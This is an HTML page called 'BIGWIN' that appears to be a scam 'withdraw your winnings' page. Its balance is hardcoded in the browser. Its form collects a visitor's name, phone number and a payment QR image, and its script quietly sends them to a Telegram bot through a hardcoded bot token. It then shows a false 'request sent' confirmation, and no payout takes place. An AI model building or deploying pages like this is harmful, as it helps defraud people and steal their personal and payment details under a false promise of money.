<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>BIGWIN</title>
    <style>
      /* Same styles as before */
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: Arial, sans-serif;
      }

      body {
        display: flex;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        min-height: 100vh;
        background: linear-gradient(135deg, #1e90ff, #ff7f50);
        overflow-y: auto;
        padding-bottom: 20px;
      }

      h1 {
        font-size: 3rem;
        color: #fff;
        animation: fadeIn 1.5s forwards, bounce 1s infinite alternate;
      }

      @keyframes bounce {
        from {
          transform: translateY(0);
        }
        to {
          transform: translateY(-10px);
        }
      }

      .form-container {
        background: rgba(255, 255, 255, 0.8);
        padding: 20px;
        border-radius: 8px;
        width: 300px;
        text-align: center;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      }

      input[type="text"],
      input[type="file"],
      input[type="number"] {
        width: 100%;
        padding: 10px;
        margin: 10px 0;
        border-radius: 4px;
        border: 1px solid #ccc;
        font-size: 16px;
        text-align: center;
        transition: 0.3s;
      }

      input[type="text"]:focus,
      input[type="number"]:focus {
        border-color: #1e90ff;
        outline: none;
      }

      button {
        padding: 10px 20px;
        background-color: #1e90ff;
        border: none;
        color: #fff;
        font-size: 1rem;
        cursor: pointer;
        border-radius: 4px;
        width: 100%;
      }

      button:hover {
        background-color: #ff7f50;
      }

      .balance {
        margin-top: 20px;
        font-size: 1.5rem;
        color: #fff;
      }

      .popup {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background-color: white;
        padding: 20px;
        border-radius: 8px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        z-index: 10;
        text-align: center;
        display: none;
        width: 300px;
      }

      .popup h2 {
        font-size: 1.5rem;
        margin-bottom: 15px;
      }

      .popup p {
        margin-bottom: 20px;
      }

      .popup button {
        background-color: #1e90ff;
        border: none;
        color: #fff;
        padding: 10px 20px;
        border-radius: 5px;
        cursor: pointer;
        font-size: 1rem;
      }

      .popup button:hover {
        background-color: #ff7f50;
      }

      .overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.5);
        z-index: 5;
        display: none;
      }
    </style>
  </head>
  <body>
    <h1>BIGWIN</h1>
    <div class="balance">
      <p>Balance: <span id="balance">20.00</span></p>
    </div>
    <div class="form-container">
      <form id="withdrawalForm">
        <input type="text" id="name" placeholder="Your Name" required />
        <input type="text" id="phone" placeholder="Phone Number" required />
        <input
          type="number"
          id="amount"
          placeholder="Withdrawal Amount"
          required
          min="1"
          max="20"
        />
        <input type="file" id="qrCode" accept="image/*" required />
        <button type="submit">Withdraw</button>
      </form>
    </div>

    <div class="overlay" id="overlay"></div>
    <div class="popup" id="popup">
      <h2>Request Sent!</h2>
      <p>Your withdrawal request has been successfully submitted.</p>
      <button id="okButton">OK</button>
    </div>

    <script>
      const balanceSpan = document.getElementById("balance");
      let balance = 20.0;

      document
        .getElementById("withdrawalForm")
        .addEventListener("submit", function (e) {
          e.preventDefault();

          const name = document.getElementById("name").value;
          const phone = document.getElementById("phone").value;
          const amount = parseFloat(document.getElementById("amount").value);
          const qrCodeFile = document.getElementById("qrCode").files[0];

          if (amount > balance) {
            alert("Insufficient balance. Please enter a lower amount.");
            return;
          }

          if (name && phone && amount && qrCodeFile) {
            balance = 0;
            balanceSpan.textContent = balance.toFixed(2);

            sendToTelegram(name, phone, amount, qrCodeFile);

            document.getElementById("popup").style.display = "block";
            document.getElementById("overlay").style.display = "block";
          }
        });

      document
        .getElementById("okButton")
        .addEventListener("click", function () {
          document.getElementById("popup").style.display = "none";
          document.getElementById("overlay").style.display = "none";
        });

      function sendToTelegram(name, phone, amount, qrCodeFile) {
        const chatId = "5786268361";
        const botToken = "7741281791:AAEDO6kZ74HWd9fqubMe4i8PD2kzCjcggyc";

        const message = `ðŸ”” Withdrawal Request:\n\nðŸ‘¤ Name: ${name}\nðŸ“ž Phone: ${phone}\nðŸ’µ Amount: ${amount}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: message }),
        })
          .then((response) => response.json())
          .then((data) => {
            if (data.ok) {
              const formData = new FormData();
              formData.append("chat_id", chatId);
              formData.append("photo", qrCodeFile);

              fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formData,
              })
                .then((imageResponse) => imageResponse.json())
                .then((imageData) => {
                  if (imageData.ok) {
                    alert("Withdrawal request submitted successfully!");
                  } else {
                    alert("Error uploading image. Please try again.");
                  }
                })
                .catch(() => {
                  alert("Error uploading image. Please try again.");
                });
            } else {
              alert("Error sending message. Please try again.");
            }
          })
          .catch(() => {
            alert("Error submitting withdrawal request. Please try again.");
          });
      }
    </script>
  </body>
</html>
